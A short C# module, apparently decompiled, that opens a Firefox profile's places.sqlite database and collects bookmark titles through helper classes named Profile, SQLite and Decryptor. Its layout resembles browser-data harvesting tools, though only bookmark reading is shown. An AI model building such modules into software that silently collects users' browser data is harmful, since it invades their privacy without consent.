using System.Collections.Generic;
using System.IO;

namespace exos.Bookmarks;

internal class Bookmarks
{
	public static List<Bookmark> Get(string BrowserDir)
	{
		List<Bookmark> list = new List<Bookmark>();
		string profile = Profile.GetProfile(BrowserDir);
		if (profile == null)
		{
			return list;
		}
		SQLite sQLite = SQLite.ReadTable(Path.Combine(profile, "places.sqlite"), "moz_bookmarks");
		if (sQLite == null)
		{
			return list;
		}
		for (int i = 0; i < sQLite.GetRowCount(); i++)
		{
			Bookmark item = default(Bookmark);
			item.sTitle = Decryptor.GetUTF8(sQLite.GetValue(i, 5));
			if (Decryptor.GetUTF8(sQLite.GetValue(i, 1)).Equals("0") && item.sTitle != "0")
			{
				list.Add(item);
			}
		}
		return list;
	}
}
